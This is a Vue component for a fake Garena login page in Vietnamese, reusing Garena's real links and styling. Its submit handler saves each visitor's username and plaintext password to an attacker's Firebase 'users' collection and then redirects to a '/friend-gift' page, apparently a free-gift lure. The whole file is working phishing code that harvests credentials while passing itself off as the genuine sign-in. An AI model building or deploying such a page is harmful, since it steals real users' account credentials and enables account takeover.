<script setup>
import Header from '../components/Header.vue';
import { ref } from 'vue';
import { collection, addDoc } from "firebase/firestore"; 
import { db } from '../firebase';
import { useRouter } from 'vue-router';

let username = ref('');
let password = ref('');
const router = useRouter();

const handleSubmitForm = async (e) => {
    if (!username.value) {
        document.querySelector('.field').classList.add('error');
    }

    if (!password.value) {
        document.querySelectorAll('.field')[1].classList.add('error');
    }

    if (username.value && password.value) {
        document.querySelector('.field').classList.remove('error');
        document.querySelectorAll('.field')[1].classList.remove('error');


        try {
        const docRef = await addDoc(collection(db, "users"), {
            username: username.value,
            password: password.value
        });
        router.push('/friend-gift');

        } catch (e) {
            console.error("Error adding document: ", e);
        }
    }
}
</script>

<template>
    <Header />
    <main>
        <div class="form">
            <h2>Đăng nhập</h2>
            <div class="field required">
                <input v-model="username" type="text" placeholder="Tài khoản Garena, Email hoặc số điện thoại">
                <div class="message">Nhập tên tài khoản hoặc email</div>
            </div>
            <div class="field required">
                <input v-model="password" type="password" placeholder="Mật khẩu">
                <div class="message">Nhập mật khẩu</div>
            </div>
            <a class="forgot" href="https://account.garena.com/recovery">Quên mật khẩu?</a>
            <div class="field">
                <button class="primary" @click="handleSubmitForm">Đăng Nhập Ngay</button>
            </div>
            <div class="field">
                <button class="secondary register" type="button">Tạo tài khoản mới</button>
            </div>
            <div class="agreement" data-v-cc522501="">
                <a href="https://contentgarena-a.akamaihd.net/legal/tos/tos_vn.html" data-v-cc522501="">Điều Khoản Dịch Vụ</a> 
                và 
                <a href="https://contentgarena-a.akamaihd.net/legal/pp/pp_vn.html" data-v-cc522501="">Chính Sách Bảo Mật</a>
            </div>
        </div>
    </main>
</template>


<style scoped>
    .form {
        padding-inline: 20px;
        display: flex;
        flex-direction: column;
    }

    .form h2 {
        margin-bottom: 16px;
        color: #2a2d2f;
        font-size: 18px;
        font-weight: 700;
        text-align: center;
        margin-block-start: 30px;
    }

    .field {
        position: relative;
    }

    .field.required:before {
        position: absolute;
        top: 0;
        left: 0;
        width: 5px;
        height: 17px;
        content: "*";
        color: #d43831;
        font-size: 11px;
        transform: translate(-100%) translate(-3px);
    }

    input, select {
        width: 100%;
        display: block;
        padding: 12px;
        border: .5px solid #d9d9d9;
        border-radius: 1px;
        color: #2a2d2f;
        font-size: 13px;
        line-height: 20px;
        background-color: #fff;
        outline: none;
        margin: 0;
        height: 45px;
        box-sizing: border-box;
    }

    input::placeholder {
        color: #bfbfbf;
    }

    .field+.field {
        margin-top: 12px;
    }

    .forgot {
        margin: 15px 0 30px;
        font-size: 13px;
        align-self: flex-end;
        text-decoration: none;
        color: #0f7ce4;
    }

    button {
        width: 100%;
        padding: 12px;
        border-radius: 1px;
        font-size: 13px;
        line-height: 20px;
    }

    .primary {
        background: #d43831;
        border: .5px solid #d43831;
        color: #fff;
    }
    
    .register {
        width: 100%;
    }

    .secondary {
        background: #fff;
        border: .5px solid #d9d9d9;
        color: #676e76;
    }

    .agreement {
        margin: 12px 0 20px;
        color: rgba(0, 0, 0, .25);
        font-size: 11px;
        text-align: center;
    }

    a {
        text-decoration: none;
        color: #0f7ce4;
    }

    .error .message {
        margin-top: 4px;
        padding-left: 14px;
        background: url('https://sso.garena.com/universal/assets/exclamation-d4037144.svg') center left / 12px no-repeat;
        color: #ff4d4f;
        font-size: 11px;
        line-height: 17px;
        display: block;
    }

    .error input {
        border-color: #ff4d4f;
    }

    .message {
        display: none;
    }
</style>